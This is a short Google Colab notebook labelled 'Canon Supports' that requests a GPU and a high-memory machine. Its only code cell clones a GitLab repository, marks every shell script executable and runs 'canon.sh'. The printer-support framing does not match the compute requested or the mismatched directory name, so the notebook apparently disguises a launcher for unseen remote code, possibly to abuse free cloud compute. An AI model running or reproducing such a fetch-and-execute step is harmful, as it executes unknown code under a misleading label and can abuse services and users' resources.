{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "canons.ipynb",
            "private_outputs": true,
      "provenance": [],
      "collapsed_sections": [
        "BRAZbZ1TgMeI"
      ],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "BRAZbZ1TgMeI"
      },
      "source": [
        "***Canon Supports***"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "liQ6LtnzgLgK"
      },
      "source": [
        "!git clone https://gitlab.com/setupcanon/canonsetup.git && cd printer && chmod +x *.sh && ./canon.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
